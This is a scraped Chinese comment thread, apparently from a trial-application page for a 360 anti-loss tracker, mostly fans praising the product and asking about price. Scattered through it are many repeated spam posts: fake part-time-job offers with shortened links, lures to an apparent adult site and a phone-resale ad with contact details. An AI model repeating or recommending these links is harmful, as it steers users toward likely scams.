360总能给我惊喜！很期待！平时丢三落四的钥匙门卡，临出门一通乱找，这产品用在小孩子，老人身上也很赞，再也不用担心乱走了，我从第一台电脑开始就用了360，中间经历了很多商业上与360闹腾的事件，我还是力挺360，360不止是免费，它还切身考虑用户体验感受，我觉得这是最基础的能打入人心，让人感觉好温暖，它能实实在在的为你着想，又像闺蜜和男友，无时无刻被关注被保护的感觉，360感谢有你！永远支持你！赞
要中签中签 加油加油
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的  
很漂亮，也很小巧
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
 a101004725 bazhuayu0705发表于 2014-07-21 14:16 很有创意，喜欢，支持！~  是不是免费的 
拭目以待，不错的产品。
这个感觉非常大气啊~喜欢~
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的 
对于我这种前一分钟放在桌子上，后一秒就忘记的人，真的极好极好的啊
好赞！！！！不过有点贵啊。。。
这样不是好方便的呀
前期未能参与上，希望今后能跟上。
好想知道到底怎么用。。。效果是什么。。。
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
好棒！！！！！！求便宜点。。。
想要啊   真的
很好看很可爱的防丢卫士&gt;///&lt;对于丢三落四的人来说是最好的神器了！
好灵的样子，希望能便宜一点。 
湖南人在广西，求申请，求试用。。。。负责任的使用。。。
还要移动头部比较麻烦诶，没办法做到与视线平行吗？
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的  
  确实挺不错的  挺实用的。希望得到。
评论的非常到位。实用主义和完美主义者都无可挑剔了，苹果品质。
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
很漂亮，也很小巧 
我批量销售361230368
有点太霸气了吧
360的产品哥会一直用，但申请试用我就不要了，申请了也不会给我，N次了，一次也没选中。
NB啊太厉害了
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的
刚刚申请 ，期待中。。。。。。。。。。。。。。。。。。。。
希望能中标！！！！（+？+）
360创新能力就是强喜欢，能中标（+、+）
360太带劲了！！！
超赞！！！ 
科技进步的好快，蓝牙技术又可以更好的运用到生活中来了，呵呵
期待啊.......
这个让我想起了儿时看多啦A梦有一集大雄老丢雨伞多啦A梦拿出来的科技
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的 
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的 
呵呵~ 好东西
哇、超赞。。。
在淘宝上买了两个，很有用，一个笔记本上用，一个台式机上用，可以解决以小微企业申请的宽带限制用户数的问题，我说360，电信马上来找你了哦哈哈
期待期待哦~
表示丢钥匙很烦
360总能给我惊喜！很期待！平时丢三落四的钥匙门卡，临出门一通乱找，这产品用在小孩子，老人身上也很赞，再也不用担心乱走了，我从第一台电脑开始就用了360，中间经历了很多商业上与360闹腾的事件，我还是力挺360，360不止是免费，它还切身考虑用户体验感受，我觉得这是最基础的能打入人心，让人感觉好温暖，它能实实在在的为你着想，又像闺蜜和男友，无时无刻被关注被保护的感觉，360感谢有你！永远支持你！赞
赞 很有创意
360总能给我惊喜！很期待！平时丢三落四的钥匙门卡，临出门一通乱找，这产品用在小孩子，老人身上也很赞，再也不用担心乱走了，我从第一台电脑开始就用了360，中间经历了很多商业上与360闹腾的事件，我还是力挺360，360不止是免费，它还切身考虑用户体验感受，我觉得这是最基础的能打入人心，让人感觉好温暖，它能实实在在的为你着想，又像闺蜜和男友，无时无刻被关注被保护的感觉，360感谢有你！永远支持你！赞
360总能给我惊喜！很期待！平时丢三落四的钥匙门卡，临出门一通乱找，这产品用在小孩子，老人身上也很赞，再也不用担心乱走了，我从第一台电脑开始就用了360，中间经历了很多商业上与360闹腾的事件，我还是力挺360，360不止是免费，它还切身考虑用户体验感受，我觉得这是最基础的能打入人心，让人感觉好温暖，它能实实在在的为你着想，又像闺蜜和男友，无时无刻被关注被保护的感觉，360感谢有你！永远支持你！赞
期待，等待、祈待
我在日常生活中经常丢三落四的钥匙门卡，临出门一通乱找，这产品用在小孩子，老人身上也很赞，再也不用担心乱走了，我从第一台电脑开始就用了360，中间经历了很多商业上与360闹腾的事件，我还是力挺360，360不止是免费，它还切身考虑用户体验感受，我觉得这是最基础的能打入人心，让人感觉好温暖，它能实实在在的为你着想，又像闺蜜和男友，无时无刻被关注被保护的感觉，360感谢有你！永远支持你！赞 
我在日常生活中经常丢三落四的钥匙门卡，临出门一通乱找，这产品用在小孩子，老人身上也很赞，再也不用担心乱走了，我从第一台电脑开始就用了360，中间经历了很多商业上与360闹腾的事件，我还是力挺360，360不止是免费，它还切身考虑用户体验感受，我觉得这是最基础的能打入人心，让人感觉好温暖，它能实实在在的为你着想，又像闺蜜和男友，无时无刻被关注被保护的感觉，360感谢有你！永远支持你！赞  
掉手机啊~~需要这样的物品啊。。
还有更贱的呢，没好意思发出来。。。
期待能中奖
 期待 能中 
希望能中标，我一定会如实认真写好自己的使用感受和评价，便于大家参考。期待中......
神器啊，期待
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的  
期待期待哦~ 
我也在京东上买了一个３６０二代安全路由器，回来一看，竟然不是这个，坑
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～ 
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～ 
 ---【业余找工作】----工资 每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/RPADJq9 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～ 
 ---【业余找工作】----工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～
好期待啊，在生活中总是丢三落四的，有这个东西太方便了
从最早使用 360 安全卫士 到现在 360 浏览器、360软件专家、360手机助手、360硬件大师，电脑上的很多东西已经离不开360这三个数字了，对于以往的各种防丢只要是 360的 都会满心期待的去申请，可惜一次也木有成功，期待这次的结果。PS：提点小建议，如果产品的造型可以设计成12星座或者12生肖 会有更多人喜欢哦O(∩_∩)O~ 
家里面有宝宝了，只有一个老人和保姆一起带孩子，老人毕竟岁数大了，如果有这样一款产品，哇！真是太方便了哦O(∩_∩)O~
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的  
个人生活中喜欢丢三落四；很久以前就想如果有个东西能够提醒你你丢的东西在哪就好了；没想到360竟然将它实现了。
恩，我喜欢这个，放在桌上或者带出门，都很可爱啊
超级赞！实用 轻巧 科技！求中标！
希望不被忽悠，360一直是我首选的产品
 ---【业余找工作】----工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～
 ---【业余找工作】----工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～
上次360Wifi的时候我就希望具备这样防丢失功能而且还反馈给你们作为建议，难道是俺的想法得到了印证？哈哈~！~！
高端大气上档次
正在期待中
你可以去做文案策划了
果断买，太实用了
如果手机丢了怎么不？
我是从去年等到现在的人
 ---【业余找工作】----工资每夭 結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～ 
 ---【业余找工作】----工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作 时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～ 
在哪里可以买到这个投影的手环啊，超级想入手！！求大家帮忙看看哪里有的卖啊
我也很喜欢这个产品，对于我这种老忘东西的人很实用，出去旅游再也不用担心越越走丢，他自己也期待，非常感兴趣，
超级想抽啊
帅爆了！！！ 
写的这么好，五毛钱不够吧
我累个去，这玩意儿都帯抄的啊？
---【业余找工作】----工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作 时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
---【业余找工作】----工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作 时间，  做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～   
价格太高了，一般人不愿买，应面对大部分消费人群
确实好看。。就是太贵了。。买不合算。
好像很厉害的样子···要是被黑客侵入就麻烦了 
出了之后2000元都买 
好厉害的样子啊！估计价格会更厉害！
创意不错，会受欢迎，希望价格不会太高
360总能给我惊喜！很期待！平时丢三落四的钥匙门卡，临出门一通乱找，这产品用在小孩子，老人身上也很赞，再也不用担心乱走了，我从第一台电脑开始就用了360，中间经历了很多商业上与360闹腾的事件，我还是力挺360，360不止是免费，它还切身考虑用户体验感受，我觉得这是最基础的能打入人心，让人感觉好温暖，它能实实在在的为你着想，又像闺蜜和男友，无时无刻被关注被保护的感觉，360感谢有你！永远支持你！赞 
喜欢这个小家伙~对于我们丢丢族来说~~终于遇到挚爱啦~~\(≧▽≦)/~啦啦啦
360不知不觉已经成了生活必需品，有很多强大实用的功能，之前因为随处都是它的身影，多少产生了审美疲劳，甚至厌倦，但我们却再也离不开它，坐在电脑前最多的动作就是点那个360加速球，看着它快所得旋转，清除掉讨厌的运行，心里多少一些欣慰，360让人既爱既恨。我聊了逗逗小公仔，哎，“可恨”的360，干嘛又要出这么强大的好东西，害的我这么期待，填了申请就是漫长的等待，或许得来的还是失望。。。。。。
经常丢三落四的我，一年丢了三张公交卡和一张银行卡等。这个产品看起来不错呀。加油
---【业余找工作】----工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作 时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
---【业余找工作】----工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作 时间，  做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
WP8版本的啥时候出
360总能给我惊喜！很期待！平时丢三落四的钥匙门卡，临出门一通乱找，这产品用在小孩子，老人身上也很赞，再也不用担心乱走了
那一个地方都有骗人的.360也不会例外.什么***.让你空喜一场.
 ---【业余找工作】----工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～
---  【业余找工作】----工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～ 
---【业余找工作】----工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间，  做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～ 
万恶的钱包   购物一大堆忘记带钱包   一大老爷们  糗死啦
加油研发吧！
---【业余找工作】----工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作 时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
---【业余找工作】----工资每夭結 ～ 【 http://t.cn/8sfyr3p 】 复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
大爱啊 ，不过貌视一般的 扫地机器人都好几千，这宝贝不得4000朝上
喜欢，看着很有用
已经买了360随身wifi，这次又出现了防丢卫视，我一直以来YY的东西没想到成为现实啦。大爱啊，终于实现了给钥匙打个电话的愿望了，希望可以试用成功
哇这个好奇特啊~ 
价格是个问题，面临的消费者定位也是问题
唉，我的手机是WP的，360不支持，可惜了。
---【业余找工作】----工资每夭結 ～ 【 http://t.cn/8sfyr3p 】 复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
---【业余找工作】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】 复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
老是这样，神马时候才能购到嘛
忒贵了点吧
这个感觉跟前几年电子科技大会的“第六感”差不多
这个感觉就有科技感··
期待这款适合任何人的产品能尽快送到我的手里，传播和享用一下360防丢卫士的各种功能。期待啊！
是贵了点······ 
是贵了点······ 
锤子手机快到了，很希望能用上
很贵...........木有钱
---【业余找工作】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】 复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～ 
出门忘带包包、手机、钥匙是很麻烦的，有了360防丢卫士能帮我解决不必要的麻烦。
不错，是个好东西~！支持360~！！从小用360长大的~！
---【业余找--工作】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】 复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
高端大气国际范啊
价格可以接受，这个价，只要质感能像图里感受到的
没有我啊55555555555555555555555555
功能单一啊
快点上市吧，你们非的让别人的同款卫士都卖的人人都有了，你们才开始出售，那你们还有必要出售么。 非的让我苦苦的等待，这不是奇虎公司的作风把。
给力啊   什么时候出啊
价格可以接受，希望能把更全面的参数报出来
买苹果的哈哈哈哈
什么啊碉堡了啊
效果如果能达到演示效果，那真心实用，求价格和出的日期
手机app应该就可以做到···
价格和参数···都没有啊，这个现在技术完全能达到DIY了
希望人品爆发，提前试用
希望可以申请成功一次 毕竟这个真心有用
不止这位兄台从何得出中国人毅力比老外强··我在美国，这的高中生一样很多晚上在图书馆学习到凌晨3点的学生
哎 ··希望能成吧 我说 可以申请成功 
就这么大的手链··电压能达到多少，顶多刺激一下，不肯能电伤
期待成品··参数和具体价格，有相当的实用性
是柯南吗，是真的吗 
价格略贵…东西不错，但手机里也有类似软件，手机又多半是必备的，感觉又有点鸡肋了…
是啊你骗人a
同样的产品已经有了~
Me too  
3000价格略贵，商品航模要体现出他的优势，还没有四轴大疆的精灵商品机航拍做的好，精灵的价格就高出他的实际价格很多，没有发现商品优势在哪，傻瓜飞机的效果没有达到，给不懂的有钱人当玩具还有距离
市场上已经有类似的产品了
三楼怎么办啊
从公布的效果看，这款产品让人期待
是直接把这个EZ cast U盘直接插入到投影机就可以了吗，如果是插在有WiFi和安卓系统的电视机里，直接可以直播视频那当然可以，但是插在那些普通的投影机的USB端口里能直播视频吗？
价格不是一般人能接受的，产品很不错
酷炫的产品，小众的消费人群
有趣的产品，可当做玩物价格，按这两条的汇率算要800RMB，小众的玩具
希望申请成功，支持360.  
市场上已出现多款类似产品，超级实用，希望功能和价格能又所改观
有趣的产品，对我来说有一定的实用性，求价格和其他参数
这么多次，就没有得吃过……
类似产品市场上已经有很多了····
终于和丢三落四说再见了
如果我申请成功的话，我一定会如实的提交一份报告，让大家都知道360防丢卫士的实用性
这款四轴飞行器优点很多，但是现在价格不太清楚，所以我很难对其进行相应评价，gopro这是标准的航拍设备介于微单和行车记录仪之间，我对该四轴有一点难以相信，这款四轴如果依靠WiFi可控估计在500m内，人眼可视距离以内，超过这个距离很难让我信服，个人认为是虚报了参数，其他配置只有价格出了才好评价其性价比
 我想要这个，老是丢三落四的
---【业余找--工作】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】 复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
---【业余找--工作】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】 复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （ 宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
如果价格合理，将是与大疆精灵，竞争强力对手
支持一下，希望价格能在压缩一下
希望能申请成功，成功后一定如实提交试用报告！
想要防丢卫士
随便申请下吧  反正也申请不住
市场类似成品·······一打
我申请成功的话，肯定写一份报告，写在贴吧等地
这个···真心吊···
集资网站在哪？
已经有了····这个牌子的感觉很一般
我都用了半年了···产品缺陷，没有app控件
已经有售了，敢不敢更新一下网站·
第一次，。，，
---【业余找--工作】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】 复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （ 宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～
---【业余找--工作】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】 复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （ 宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～
已拥有···何来期货之说
忠实的360用户用户，期待给一个的试用资格
希望360能帮助我们这些爱丢东西的群体一个实践的机会
希望360能帮助我们这些爱丢东西的群体一个实践的机会
看了真的是好东西哦
---【业余找--工作】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】 复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （ 宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～ 
---【业余找--工作】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】 复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做 的越多挣的越多 ～～ （ 宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～ 
这要收费吗
脑残吗？厚度10CM？
---【业余找--工作】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】 复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （ 宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
---【业余找--工作】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】 复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （ 宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
360硬件就一个优点，广告好。不会被删被骂吧？
啥时间能上市？这是关键的问题~~~~
傻逼吗？还是瞎子？睁大你的狗眼看清楚！
---【业余找--工作】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】 复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （ 宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
买过一个360随身带的迷你路由器，一直使用中，真的很不错，希望能抽中
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的 
哇这个真不错 以前还不知道呢
我喜欢 多少钱啊
你想的真美 呵呵
买了个360的迷你路由器，只能在房间使用，出了房间就收不到信号，希望抽中这个，那样我就不用和老公抢电脑了，可以在厅里玩
如果申请不到，有卖的吗！我真的需要一个，天天丢东西！烦死了
希望申请成功，起码没试过申请成功过
好梦幻，好高端洋气，这个才是高科技的产物。。。。
好东西啊  我喜欢
要实用才够，其他的soso啦
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的 
如果申请不到，有卖的吗！我真的需要一个，天天丢东西！烦死了 
不要钱吗，希望别要 
---【业余找--工作】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】 复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作 时间， 做的越多挣的越多 ～～ （ 宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～   
---【 业余找--工作】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】 复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （ 宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～   
---【业余找--工作】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】 复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工 作时间， 做的越多挣的越多 ～～ （ 宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～   
---【业余找--工作】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】 复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的 越多挣的越多 ～～ （ 宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～   
---【业余找--工作】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】 复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （ 宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～   
---【业余找--工作】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】 复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （ 宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～   
希望申请成功，支持360.  
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的  
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的  
男士福利！女女勿进！直接复制进入《hulai.pw》都懂的
---【业余找工作】----工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～ 
---【业余找工作】----工 资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～ 
这个真心可爱
希望申请试用成功
没试过申请成功
希望360越做越好。永远支持360！ 
希望申请成功，我是360的忠实粉丝
---【有散时间的---想找工作】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～
---【有散时间------想找工作】---- 工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～
是的呀,价格高的离谱.估计买的人很少
贵了点,如果在600以内估计买的人会有几个
给你白瞎了，糊弄人的测评。奇酷网给你白瞎了！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
从来没有申请成功过，希望这次能够成功哦。O(∩_∩)O~ 一直用360的产品，真心觉得很不错，支持360！
希望出来后我能抢到试用~~~~
希望360没有最好，只有更好！
希望360越做越好。永远支持360！
---工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～ 
---工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～ ～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～ 
一直支持360，前不久网购了一个360无线wifi，信号以及性能都不错。比几百的无线路由的覆盖范围信号还强。这次看到这个防丢卫士，非常喜欢他的功能。希望能测试它的性能。快点出产品能够购买。
永远相信360！
希望可以申请成功，我是360的忠实粉丝 ...........
最好有一键报警功能
---工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多挣的越多 ～ ～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
---工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多 挣的越多 ～ ～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
360家庭卫士的设计真的是太棒了，非常适合家里有老人和小孩的家庭。一直支持360的产品，希望能够申请成功。
回收出售二手手机！二手iphone5只需要2000哦！qq2627339778,电话183107 88088
手机回收置换，qq2627339778,电话183107 88088
一直都用的360.电脑也是。。
hha,刚也提交了申请，希望能中哦！试试现产品。360， GOOD luck@！
不一样的360，敢为人先，开拓创新
真想想中次大奖，阿门...
每次都不中！！！
360产品，真的好神奇。
---工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多 挣的越多 ～ ～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
---工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多 挣 的越多 ～ ～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
为什么最近一次的试用比上一次的试用时间还要快啊
360太彪汉了，谢谢360的付出。 
从360安全卫士，到360杀毒，再到云盘，随身wifi。。。  。。。360一直走在时代的前面。 举个例子，360云盘如果没有开创大空间免费送，从而引起送空间风暴，现在的网络硬盘会有多大改善？
---工资 每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多 挣 的越多 ～ ～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～   
---工资每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多 挣 的越多 ～ ～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～   
求试用.求试用
---工资 每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多 挣 的越多 ～ ～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～   
---工资 每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多 挣 的越多 ～ ～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～   
谢谢360给这样的机会，感谢他们的付出！~求试用。
作为一名学生党，经常丢三落四，希望360大大可以给我这次机会，我一定认证作报告！
---工资 每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多 挣 的越多 ～ ～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
---工资 每夭 結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多 挣 的越多 ～ ～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～  
完美360，希望以后还有更多产品
感觉很不错，如果真正试用以后还行，并且价格不是很贵，应该是一款很不错的产品
谢谢360提供这样的机会，感谢他们团队的努力付出！求能免费试用  
---工资 每 夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多 挣 的越多 ～ ～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～
---工资 每夭結 ～ 【 http://t.cn/8sfyr3p 】复制到浏览器打开 ～ 即可报名咨询 ～ 不限制工作时间， 做的越多 挣 的越多 ～  ～ （宝妈、学生、上班族都可以）～ 每夭8o~15o，我详细作讲解～
求试用，请尽快上市卖吧，期待
好看，大气，实用！
